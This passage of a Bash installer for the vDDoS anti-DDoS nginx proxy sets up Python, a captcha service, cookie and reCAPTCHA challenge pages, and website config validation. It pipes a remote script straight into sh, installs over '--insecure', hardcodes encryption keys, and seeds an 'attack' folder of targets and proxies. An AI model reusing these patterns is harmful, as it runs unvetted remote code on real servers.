	/usr/local/bin/python2.7 ez_setup.py --insecure  >/dev/null 2>&1
	sleep 15
	/usr/local/bin/easy_install-2.7 pip  >/dev/null 2>&1
	sleep 15
	if [ ! -f /usr/local/bin/pip ]; then
		echo 'ERROR! Installing Python fail!
		'
		rm -rf /vddos/
		exit 0
	fi
	echo 'Installing Python success!'
	echo -n '...'
	
	cd /vddos/captcha
	/usr/local/bin/pip install -r requirements.txt  >/dev/null 2>&1
	sleep 15
	chmod +x start.sh
	ln -s /vddos/captcha/settings.py /vddos/conf.d/recaptcha-secretkey.conf
	touch /vddos/conf.d/recaptcha-sitekey.conf
	echo '# Website		reCaptcha-sitekey (View KEY in https://www.google.com/recaptcha/admin#list)
your-domain.com		6Lcr6QkUAAAAAO3858dCLTgdHJM-2VYo8CXaQJjO' > /vddos/conf.d/recaptcha-sitekey.conf
	deletelich='@reboot root sleep 5 && cd /vddos/captcha && sh start.sh'
	sed -i "s/.*$deletelich.*//" /etc/crontab  >/dev/null 2>&1
	echo '@reboot root sleep 5 && cd /vddos/captcha && sh start.sh' | sudo tee --append /etc/crontab  >/dev/null 2>&1
	cd /vddos/captcha ;
	(sh start.sh &) &
	sleep 1 ;
	
	
	# Tạo thư mục attack:
	mkdir -p /vddos/attack
	touch /vddos/attack/target-list.txt; echo 'http://example.com:80/index.html' > /vddos/attack/target-list.txt
	touch /vddos/attack/proxy-list.txt; echo '123.123.123.123:8080' > /vddos/attack/proxy-list.txt
	touch /vddos/attack/useragent-list.txt
	curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/user-agents1.txt -o /vddos/attack/useragent-list.txt --silent
	
	# Cài vDDoS có thành công hay không:
	if [ ! -f /vddos/vddos ]; then
		echo 'ERROR! Installing vDDoS fail!
		'
		rm -rf /vddos/
		exit 0
	fi

	# Cài Let Encrypt ACME Shell script: acme.sh
	curl --silent https://get.acme.sh | sh  >/dev/null 2>&1
	# Tạo thư mục cho Let's Encrypt
	mkdir -p /vddos/letsencrypt/.well-known/acme-challenge


	echo 'Installing vDDoS success!

Please run command "vddos help" to learn Command Line Usage vDDoS. Thank you for using!
	'
	exit 0
fi


################## Định nghĩa hàm xóa file cấu hình vddos:
function deletefileconf()
{
	sleep 1
	rm -rf /vddos/vddos.conf  >/dev/null 2>&1
	rm -rf /vddos/conf.d/*.vddos.conf  >/dev/null 2>&1
	return 0
}
################## Định nghĩa hàm kiểm tra file website.conf vddos:
function checkfilewebsiteconf()
{

	# Nếu file website.conf không tồn tại:
	if [ ! -f /vddos/conf.d/website.conf ]; then
		echo '# Website       Listen            Backend               Cache  Security  SSL-Prikey  SSL-CRTkey
your-domain.com	http://0.0.0.0:80 http://127.0.0.1:8080 no     200       no          no
		' > /vddos/conf.d/website.conf
		echo 'ERROR! Please Input Your Website to /vddos/conf.d/website.conf!
		'
		exit 0
	fi



	# Kiểm tra độ chính xác của từng dòng nội dung file website.conf:
	ten_file_chua_list="/vddos/conf.d/website.conf"
	echo "`cat $ten_file_chua_list | grep .`" > $ten_file_chua_list
	so_dong_file_chua_list=`cat $ten_file_chua_list | grep . | wc -l`
	so_dong_bat_dau_tim=1

	dong=$so_dong_bat_dau_tim
	while [ $dong -le $so_dong_file_chua_list ]
	do
		noidungdonghientai=$(awk " NR == $dong " $ten_file_chua_list)
		cotdautiencuadong=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $1'} | awk '{print substr($0,1,1)}'` # ký tự đầu tiên của cột đầu tiên của dòng này có # hay không


		# Nếu dòng đầu tiên không có # thì mới tiến hành ghi nhận và kiểm tra:
		if [ "$cotdautiencuadong" != '#' ]; then 


			Website=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $1'}`
			Listen=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $2'}`
			Backend=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $3'}`
			Cache=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $4'}`
			Security=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $5'}`
			SSL_Prikey=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $6'}`
			SSL_CRTkey=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $7'}`

			# Nếu Website khác default thì Kiểm tra Website có định dạng của 1 domain name hay không:
			if [ "$Website" != 'default' ]; then 
				Websitestringcheck=`echo $Website | grep -P '(?=^.{4,253}$)(^((?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.)+[a-zA-Z]{2,63}$)'`
				if [ "$Website" != "$Websitestringcheck" ]; then
					echo 'ERROR!'
					echo "$Website line $dong in $ten_file_chua_list
Please choose a valid for Website Domain: your-domain.com|google.com|bing.com|...
					"
					exit 0
				fi
			fi





			# Kiểm tra Listen có hợp lệ là 1 URL và URL này có là HTTP(S) hay không:
			regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
			if [[ $Listen =~ $regex ]]; then
				cat /dev/null
				else
				echo 'ERROR!'
				echo "$Listen line $dong in $ten_file_chua_list
Please choose a valid for Listen type: http://0.0.0.0:80|https://0.0.0.0:443|...
				"
				exit 0
			fi


			ListenHTTPorHTTPS=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $2'} | awk '{print substr($0,1,6)}'` # 6 ký tự đầu tiên của cột Listen cho biết đây là http hay https

			if [ $ListenHTTPorHTTPS = 'https:' ]; then
				ListenHTTPorHTTPS='https'

				else
				if [ $ListenHTTPorHTTPS = 'http:/' ]; then
					ListenHTTPorHTTPS='http'
					else
					echo 'ERROR!'
					echo "$Listen line $dong in $ten_file_chua_list
Please choose a valid for Listen type: http://0.0.0.0:80|https://0.0.0.0:443|...
					"
					exit 0
				fi
			fi

			# Kiểm tra Backend có hợp lệ là 1 URL và URL này có là HTTP(S) hay không:
			regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
			if [[ $Backend =~ $regex ]]; then
				cat /dev/null
				else
				echo 'ERROR!'
				echo "$Listen line $dong in $ten_file_chua_list
Please choose a valid for Backend Server: http://127.0.0.1:8080|https://127.0.0.1:8443|...
				"
				exit 0
			fi

			BackendHTTPorHTTPS=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $3'} | awk '{print substr($0,1,6)}'`

			if [ $BackendHTTPorHTTPS = 'https:' ]; then
				BackendHTTPorHTTPS='https'

				else
				if [ $BackendHTTPorHTTPS = 'http:/' ]; then
					BackendHTTPorHTTPS='http'
					cat /dev/null
					else
					echo 'ERROR!'
					echo "$Backend line $dong in $ten_file_chua_list
Please choose a valid for Backend Server: http://127.0.0.1:8080|https://127.0.0.1:8443|...
					"
					exit 0
				fi
			fi




			# Kiểm tra Cache
			if [ $Cache = 'no' ]; then
				Cache='no'
				else
				if [ $Cache = 'yes' ]; then
					Cache='yes'
					else
					echo 'ERROR!'
					echo "$Cache line $dong in $ten_file_chua_list
Please choose a valid for Caching: yes|no
					"
					exit 0
				fi
			fi



			# Kiểm tra Security
			if [ $Security = 'no' ]; then
				Security='no'
				else
				if [ $Security = '307' ]; then
					Security='307'
					else
					if [ $Security = '200' ]; then
						Security='200'
						else
						if [ $Security = 'click' ]; then
							Security='click'
							else
							if [ $Security = '5s' ]; then
								Security='5s'
								else
								if [ $Security = '5s+' ]; then
									Security='5s+'
									else
									if [ $Security = 'high' ]; then
										Security='high'
										else
										if [ $Security = 'high+' ]; then
											Security='high+'
											else
											if [ $Security = 'captcha' ]; then
												Security='captcha'
												else
												if [ $Security = 'captcha+' ]; then
													Security='captcha+'
													else
													echo 'ERROR!'
													echo "$Security line $dong in $ten_file_chua_list
Please choose a valid for Security Level Protection: no|307|200|click|5s|high|captcha
													"
													exit 0
												fi
											fi
										fi
									fi
								fi
							fi
						fi
					fi
				fi
			fi


			# Kiểm tra sự hợp lệ của SSL_Prikey và SSL_CRTkey nếu có xài https?
			if [ $ListenHTTPorHTTPS = 'https' ]; then
				if [ $SSL_Prikey != 'LetEncrypt' ]; then
					if [ ! -f $SSL_Prikey ]; then
						echo 'ERROR!'
						echo "$SSL_Prikey line $dong in $ten_file_chua_list
						"
						exit 0
					fi
					if [ ! -f $SSL_CRTkey ]; then
						echo 'ERROR!'
						echo "$SSL_CRTkey line $dong in $ten_file_chua_list
						"
						exit 0
					fi

					PRI=`openssl rsa -in $SSL_Prikey -modulus -noout | openssl md5`
					CRT=`openssl x509 -in $SSL_CRTkey -modulus -noout | openssl md5`

					if [ "$PRI" != "$CRT" ]; then
						echo 'ERROR!'
						echo "$SSL_Prikey line $dong in $ten_file_chua_list"
						echo "$SSL_CRTkey line $dong in $ten_file_chua_list"
						echo "$SSL_Prikey and $SSL_CRTkey not belong together
						"
						exit 0
					fi
				fi
			fi




		fi
		#
		dong=$((dong + 1))
	done



	return 0
}




################## Định nghĩa hàm tạo file cấu hình vddos:
function makefileconf()
{

	# Nếu file website.conf không tồn tại:
	if [ ! -f /vddos/conf.d/website.conf ]; then
		echo '# Website       Listen            Backend               Cache  Security  SSL-Prikey  SSL-CRTkey
your-domain.com	http://0.0.0.0:80 http://127.0.0.1:8080 no     200       no          no
		' > /vddos/conf.d/website.conf
		echo 'ERROR! Please Input Your Website to /vddos/conf.d/website.conf!
		'
		exit 0
	fi


	# Dành cho vDDoS monitor admin
	vddos_monitor_random=$(echo -n "`hostname -f``hostname -I``TZ=Asia/Ho_Chi_Minh date +"DATE-%m-%Y"``df -h`" | md5sum | cut -c 1-10)
	IP=`curl --silent icanhazip.com`
	echo ' vDDoS Admin Monitor: http://'$IP'/'$vddos_monitor_random'-vddos-monitor' > /vddos/vDDoS_Monitor.txt
	echo ' vDDoS Admin Monitor TCP/UDP: http://'$IP'/'$vddos_monitor_random'-tcp-udp-vddos-monitor' >> /vddos/vDDoS_Monitor.txt
	chmod 700 /vddos/vDDoS_Monitor.txt



	# Kiểm tra độ chính xác của từng dòng nội dung file website.conf:
	ten_file_chua_list="/vddos/conf.d/website.conf"
	echo "`cat $ten_file_chua_list | grep .`" > $ten_file_chua_list
	so_dong_file_chua_list=`cat $ten_file_chua_list | grep . | wc -l`
	so_dong_bat_dau_tim=1

	dong=$so_dong_bat_dau_tim
	while [ $dong -le $so_dong_file_chua_list ]
	do
		noidungdonghientai=$(awk " NR == $dong " $ten_file_chua_list)
		cotdautiencuadong=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $1'} | awk '{print substr($0,1,1)}'` # ký tự đầu tiên của cột đầu tiên của dòng này có # hay không


		# Nếu dòng đầu tiên không có # thì mới tiến hành ghi nhận và kiểm tra:
		if [ "$cotdautiencuadong" != '#' ]; then 


			Website=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $1'}`
			Listen=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $2'}`
			Backend=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $3'}`
			Cache=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $4'}`
			Security=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $5'}`
			SSL_Prikey=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $6'}`
			SSL_CRTkey=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $7'}`

			# Nếu Website khác default thì Kiểm tra Website có định dạng của 1 domain name hay không:
			if [ "$Website" != 'default' ]; then 
				Websitestringcheck=`echo $Website | grep -P '(?=^.{4,253}$)(^((?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.)+[a-zA-Z]{2,63}$)'`
				if [ "$Website" != "$Websitestringcheck" ]; then
					echo 'ERROR!'
					echo "$Website line $dong in $ten_file_chua_list
Please choose a valid for Website Domain: your-domain.com|google.com|bing.com|...
					"
					exit 0
				fi
				Website1=$Website # Website1 là tên domain mà nginx lắng nghe
				Website2=$Website # Website2 là vị trí chứa cache, vị trí Website
			fi
			# Nếu Website bằng default thì cho Website bằng '~^.*$'
			if [ "$Website" = 'default' ]; then 
				random=$(cat /dev/urandom | tr -cd '0-9' | head -c 10)
				Website1='~^.*$' # Website1 là tên domain mà nginx lắng nghe
				Website2=`echo default-$random` # Website2 là vị trí chứa cache, vị trí Website

			fi

			# Kiểm tra Listen có hợp lệ là 1 URL và URL này có là HTTP(S) hay không:
			regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
			if [[ $Listen =~ $regex ]]; then
				cat /dev/null
				else
				echo 'ERROR!'
				echo "$Listen line $dong in $ten_file_chua_list
Please choose a valid for Listen type: http://0.0.0.0:80|https://0.0.0.0:443|...
				"
				exit 0
			fi


			ListenHTTPorHTTPS=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $2'} | awk '{print substr($0,1,6)}'` # 6 ký tự đầu tiên của cột Listen cho biết đây là http hay https

			if [ $ListenHTTPorHTTPS = 'https:' ]; then
				ListenHTTPorHTTPS='https'

				else
				if [ $ListenHTTPorHTTPS = 'http:/' ]; then
					ListenHTTPorHTTPS='http'
					else
					echo 'ERROR!'
					echo "$Listen line $dong in $ten_file_chua_list
Please choose a valid for Listen type: http://0.0.0.0:80|https://0.0.0.0:443|...
					"
					exit 0
				fi
			fi

			# Kiểm tra Backend có hợp lệ là 1 URL và URL này có là HTTP(S) hay không:
			regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
			if [[ $Backend =~ $regex ]]; then
				cat /dev/null
				else
				echo 'ERROR!'
				echo "$Listen line $dong in $ten_file_chua_list
Please choose a valid for Backend Server: http://127.0.0.1:8080|https://127.0.0.1:8443|...
				"
				exit 0
			fi

			BackendHTTPorHTTPS=`cat $ten_file_chua_list | awk " NR == $dong " | awk {'print $3'} | awk '{print substr($0,1,6)}'`

			if [ $BackendHTTPorHTTPS = 'https:' ]; then
				BackendHTTPorHTTPS='https'

				else
				if [ $BackendHTTPorHTTPS = 'http:/' ]; then
					BackendHTTPorHTTPS='http'
					cat /dev/null
					else
					echo 'ERROR!'
					echo "$Backend line $dong in $ten_file_chua_list
Please choose a valid for Backend Server: http://127.0.0.1:8080|https://127.0.0.1:8443|...
					"
					exit 0
				fi
			fi




			# Kiểm tra Cache
			if [ $Cache = 'no' ]; then
				Cache='no'
				Cacheconfig1=`cat /dev/null`
				Cacheconfig2=''
				Cacheconfig3=`cat /dev/null`
				Cacheconfig4=`cat /dev/null`
				else
				if [ $Cache = 'yes' ]; then
					Cache='yes'
					Cacheconfig1='
        proxy_cache %Websiteconfig2%-cache-%Cacheconfig5%;
        proxy_cache_valid 15m;
        proxy_cache_valid 404 1m;
        proxy_no_cache $no_cache;
        proxy_cache_bypass $no_cache;
        proxy_cache_bypass $cookie_session $http_x_update;
        proxy_temp_path /var/cache/vddos/%Websiteconfig2%-temp-%Cacheconfig5%;

        proxy_cache_bypass  $http_cache_control;
        add_header X-Proxy-Cache $upstream_cache_status;

					'
					Cacheconfig2='%Websiteconfig2%-cache-%Cacheconfig5%'
					Cacheconfig3='proxy_cache    off;'
					Cacheconfig4='proxy_cache_path /var/cache/vddos/%Websiteconfig2%-cache-%Cacheconfig5% levels=1:2 keys_zone=%Websiteconfig2%-cache-%Cacheconfig5%:10m inactive=60m max_size=512m;'
					else
					echo 'ERROR!'
					echo "$Cache line $dong in $ten_file_chua_list
Please choose a valid for Caching: yes|no
					"
					exit 0
				fi
			fi



			# Kiểm tra Security

			config307='testcookie off;
	testcookie_name vDDoS;
	testcookie_secret %testcookie_secret%;
	testcookie_session $remote_addr$http_user_agent;
	testcookie_arg d;
	testcookie_max_attempts 4;
	testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
	testcookie_get_only off; testcookie_expires 0;
	testcookie_deny_keepalive off;
	testcookie_whitelist {
	%testcookie_whitelist%
	}
	location = /cookies.html {
		root /vddos/html;
	}'
			config200='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0;
    testcookie_deny_keepalive off;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_template '"'"'<html><body><script>document.cookie="vDDoS=$testcookie_set ; expires=0; path=/";location.href="$testcookie_nexturl";</script></body></html>'"'"';

    location = /cookies.html {
        root /vddos/html;
    }'
			configclick='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0;
    testcookie_deny_keepalive off;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_template '"'"'<html><body><script>function bla() { document.cookie="vDDoS=$testcookie_set ; expires=0; path=/";location.href="$testcookie_nexturl";}</script><input type="submit" value="Please Click Me To Continue" onclick="bla();"></body></html>'"'"';

    location = /cookies.html {
        root /vddos/html;
    }'
			confighigh='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0;
    testcookie_deny_keepalive off;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key random;
    testcookie_refresh_encrypt_cookie_iv random;
	testcookie_refresh_template '"'"'<html><body><script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript><script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var a=toNumbers("$testcookie_enc_key"),b=toNumbers("$testcookie_enc_iv"),c=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c,2,a,b))+"; expires=0; path=/";location.href="$testcookie_nexturl";</script></body></html>'"'"';    
	location = /cookies.html {
        root /vddos/html;
    }
	
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '

			config5s='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0;
    testcookie_deny_keepalive off;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
	testcookie_refresh_template '"'"'<!DOCTYPE html>
<html>
<script src="/vddosw3data.js"></script>
<body>
<div w3-include-html="/5s.html"></div> 
<noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<script>
w3IncludeHTML();
</script>
<script language="javascript">document.cookie="vDDoS=$testcookie_set ; expires=0; path=/";setTimeout("location.href=\'"'"'$testcookie_nexturl\'"'"';",5000);</script>
<center>
<br />
<br />
<center/>
</body>
</html>
'"'"';
	location = /5s.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
	    root /vddos/html;
	}
    location = /cookies.html {
        root /vddos/html;
    }'




			configcaptcha='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive off;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
	testcookie_refresh_template "<!DOCTYPE html>
<html>
<script src=\"/vddosw3data.js\"></script>
<body>
<div w3-include-html=\"/captcha.html\"></div>
<noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<script>
w3IncludeHTML();
</script>
<div class=\"footer\">
<center>
<script type=\"text/javascript\">var olC=function(){grecaptcha.render('"'"'captcha'"'"',{'"'"'sitekey'"'"':'"'"'%Securityline3%'"'"','"'"'callback'"'"':setcookie});};var setcookie=function(resp){document.getElementById('"'"'cpt'"'"').submit();};</script>
<script src=\"https://www.google.com/recaptcha/api.js?onload=olC&render=explicit\" async defer></script>
<form method=post action=\"/captcha\" id=\"cpt\"><div id=\"captcha\"></div></form>
<br />
<br />
</center>
</div>
</body>
</html>";
	location = /captcha.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
	    root /vddos/html;
	}
    location = /captcha {
        testcookie var;
        proxy_set_header Testcookie-Domain $host;
        proxy_set_header Testcookie-Value $testcookie_set;
        proxy_set_header Testcookie-Nexturl $http_referer;
        proxy_set_header Testcookie-Name "vDDoS";
        proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header   Host             $host;
		proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;
        proxy_pass http://127.0.0.1:10101/;
    }
	
	location = /cookies.html {
        root /vddos/html;
    }
    '

			configcaptchaplus='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 503;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive off;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
	testcookie_refresh_template "<html>
  <head>
     <script src=\"https://www.google.com/recaptcha/api.js\" async defer></script>
     <script>
       function onSubmit(token) {
         document.getElementById(\"recaptcha-form\").submit();
       }
     </script>
  </head>
  <body>
<div id=\"recaptcha-loading\" style=\"margin: 0px; padding: 0px; position: fixed; right: 0px; top: 0px; width: 100%; height: 100%;  z-index: 30001; opacity: 0.8;\">
<p style=\"position: absolute; color: White; top: 30%; left: 45%;\">
<img src=\"https://lh3.googleusercontent.com/-DXtSC0CprEQ/WeF1SNqv-RI/AAAAAAAABss/1sSorr55lXQit1bDiQgJOROtWOvf7rc-wCLcBGAs/s90/vDDoS-recaptcha-invisible.gif\">
</p>
</div>
  <center><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
    <form id='"'"'recaptcha-form'"'"' action=\"/captcha\" method=\"POST\">
      <button id='"'"'submitbutton'"'"' style=\"visibility:hidden;\" class=\"g-recaptcha\" data-badge=bottomright data-sitekey=\"%Securityline3%\" data-callback='"'"'onSubmit'"'"'></button>
        <script>
        window.onload = function(){
        document.getElementById('"'"'submitbutton'"'"').click();
		}
        </script>
      <br/>
    </form>
    </center>
  </body>
</html>";
	location = /captcha.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
	    root /vddos/html;
	}
    location = /captcha {
        testcookie var;
        proxy_set_header Testcookie-Domain $host;
        proxy_set_header Testcookie-Value $testcookie_set;
        proxy_set_header Testcookie-Nexturl $http_referer;
        proxy_set_header Testcookie-Name "vDDoS";
        proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header   Host             $host;
		proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;
        proxy_pass http://127.0.0.1:10101/;
    }
	
	location = /cookies.html {
        root /vddos/html;
    }
    '

			confighighplus1='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key bfa7722f5ecdf9b0b3da17a673a2ba42;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<html>
<body>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<script>var _0xf20d=["\x70\x75\x73\x68","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6E\x73\x74\x72\x75\x63\x74\x6F\x72","","\x30","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x59\x6D\x5A\x68\x4E\x7A\x63\x79\x4D\x6D\x59\x31\x5A\x57\x4E\x6B\x5A\x6A\x6C\x69\x4D\x47\x49\x7A\x5A\x47\x45\x78\x4E\x32\x45\x32\x4E\x7A\x4E\x68\x4D\x6D\x4A\x68\x4E\x44\x49\x3D"];function toNumbers(_0x2d30x2){var _0x2d30x3=[];_0x2d30x2[_0xf20d[1]](/(..)/g,function(_0x2d30x2){_0x2d30x3[_0xf20d[0]](parseInt(_0x2d30x2,16))});return _0x2d30x3}function toHex(){for(var _0x2d30x2=[],_0x2d30x2=1== arguments[_0xf20d[2]]&& arguments[0][_0xf20d[3]]== Array?arguments[0]:arguments,_0x2d30x3=_0xf20d[4],_0x2d30x5=0;_0x2d30x5< _0x2d30x2[_0xf20d[2]];_0x2d30x5++){_0x2d30x3+= (16> _0x2d30x2[_0x2d30x5]?_0xf20d[5]:_0xf20d[4])+ _0x2d30x2[_0x2d30x5].toString(16)};return _0x2d30x3[_0xf20d[6]]()}var a2=atob(_0xf20d[7]),a1=toNumbers(a2),b1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),b2=toNumbers(b1),c3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c3,2,a1,b2))+"; expires=0; path=/";location.href="$scheme://$host:$server_port$request_uri";</script>
</body>
</html>
'"'"';    
	location = /cookies.html {
        root /vddos/html;
    }
	
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '

			config5splus1='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key bfa7722f5ecdf9b0b3da17a673a2ba42;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<!DOCTYPE html>
<html>
<script src="/vddosw3data.js"></script>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<body>
<div w3-include-html="/5s.html"></div> 
<script>
w3IncludeHTML();
</script>
<script>var _0xf20d=["\x70\x75\x73\x68","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6E\x73\x74\x72\x75\x63\x74\x6F\x72","","\x30","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x59\x6D\x5A\x68\x4E\x7A\x63\x79\x4D\x6D\x59\x31\x5A\x57\x4E\x6B\x5A\x6A\x6C\x69\x4D\x47\x49\x7A\x5A\x47\x45\x78\x4E\x32\x45\x32\x4E\x7A\x4E\x68\x4D\x6D\x4A\x68\x4E\x44\x49\x3D"];function toNumbers(_0x2d30x2){var _0x2d30x3=[];_0x2d30x2[_0xf20d[1]](/(..)/g,function(_0x2d30x2){_0x2d30x3[_0xf20d[0]](parseInt(_0x2d30x2,16))});return _0x2d30x3}function toHex(){for(var _0x2d30x2=[],_0x2d30x2=1== arguments[_0xf20d[2]]&& arguments[0][_0xf20d[3]]== Array?arguments[0]:arguments,_0x2d30x3=_0xf20d[4],_0x2d30x5=0;_0x2d30x5< _0x2d30x2[_0xf20d[2]];_0x2d30x5++){_0x2d30x3+= (16> _0x2d30x2[_0x2d30x5]?_0xf20d[5]:_0xf20d[4])+ _0x2d30x2[_0x2d30x5].toString(16)};return _0x2d30x3[_0xf20d[6]]()}var a2=atob(_0xf20d[7]),a1=toNumbers(a2),b1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),b2=toNumbers(b1),c3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c3,2,a1,b2))+"; expires=0; 